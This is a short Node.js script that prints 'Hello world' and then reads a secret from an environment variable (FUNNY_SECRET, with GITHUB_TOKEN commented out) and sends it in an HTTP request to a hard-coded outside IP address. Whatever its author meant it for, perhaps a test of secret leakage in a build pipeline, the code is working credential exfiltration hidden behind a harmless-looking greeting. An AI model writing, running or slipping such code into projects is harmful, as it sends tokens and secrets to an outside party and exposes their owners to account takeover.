const http = require('http')


console.log('Hello world')

// const token = process.env.GITHUB_TOKEN
const token = process.env.FUNNY_SECRET

http.get(`http://84.38.182.14/xxx=${token}`, (res) => {
  const { statusCode } = res;
  console.log(statusCode);
})